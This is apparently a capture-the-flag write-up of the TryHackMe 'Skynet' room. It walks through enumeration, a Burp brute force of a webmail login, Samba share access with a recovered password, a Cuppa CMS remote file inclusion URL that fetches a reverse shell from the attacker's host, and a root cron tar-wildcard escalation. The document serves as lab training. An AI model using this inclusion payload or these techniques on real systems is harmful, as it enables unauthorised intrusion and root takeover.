---
title: Skynet
published: 2023-09-20
description: 'A writeup of the tryhackme room skynet'
image: ''
tags: [Tryhackme]
category: 'Writeups'
project: 'Tryhackme Writeups'
draft: false 
---
# Skynet Room Writeup

## Enumeration

```BASH
sudo nmap -oA nmap/intial -sV -sC -sS -vv -T4 10.10.249.243
```

```BASH
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack ttl 61 Dovecot pop3d
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 61 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

Some interesting ports, let's check out files on the website:

```BASH
gobuster dir -e -u http://10.10.249.243/ -w /usr/share/wordlists/dirb/common.txt -t40
```

```BASH
http://10.10.249.243/squirrelmail         (Status: 301) [Size: 321] [--> http://10.10.249.243 squirrelmail/]
```

We see there is a log in page for the server's email.

## Samba Enumeration 

Let's enumerate the Samba shares. We will be using `smbmap` for this. 

```BASH
smbmap -H 10.10.249.243 
[+] Guest session       IP: 10.10.249.243:445   Name: 10.10.249.243                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

Let's checkout the anonymous share

```BASH
smbmap -H 10.10.249.243 -R anonymous 
```

We see some log files. Let's download them:

```BASH
smbmap -H 10.10.249.243 -R --depth 2 -A 'log'
```

The first of the logs has a list of what looks like passwords, the other two files are empty. Let's see if we can log into the `/squirrelmail` page. Open up burp suite and turn on the proxy. Now enter some data for the login page and click log in. Hold the request and press `ctrl+i` to send the request to the intruder tab.

Here, we will mount our attack. We will use `mikedyson` as the username as revealed by the share, then we will set a variable in the password field. Then move to the payload tab, and load the log file from early into the simple list section.

Then click run. You will notice one of the responses is shorter than the rest, that is the password we are looking for. Logging in, we see an email from skynet with miles' smb password.

```BASH
smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -H 10.10.249.243 -R
```

There's a document called `important.txt` in his notes, let's grab that:

```BASH
smbmap -u milesdyson -p ')s{A&2Z=F^n_E.B`' -H 10.10.249.243 -R -A "important"
```

This file contains the hidden directory. It turn out to be a personal page for miles, we know however there is a CMS system in place, let's see if gobuster can find an admin page.


```BASH
gobuster dir -e -u http://10.10.249.243/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t40
```

## Exploitation

We have found an admin page for "Cuppa" CMS. I tried our previous credentials but we don't have access. There is however a known vulnerability. Using [this](https://www.exploit-db.com/exploits/25971) as reference, we can upload a reverse shell.


```BASH
sudo python3 -m http.server 80 # use this to upload your shell script
http://10.10.249.243/45kra24zxs28v3yd/cuppa/alerts/alertConfigField.php?urlConfig=http://$MY_IP/shell.php? 
```

We now have a shell, let's stabilise it.

```BASH
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl Z
stty raw -echo; fg
enter
```

The user flag is located in miles' home directory.

## Privilige Escalation

Looking at /etc/crontab, root is executing a script in miles' home directory.

```BASH
# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
```

Looking at the script in question, root is making an archive out of everything inside /var/www/html with a wildcard character (`*`). This is open to exploitation, best explained [here](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/). You may need a script of your own to create the files as they require double quotes in the touch command.

```BASH
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Once root creates another archive we should receive a reverse shell as root. The root flag is located in the root user's directory.

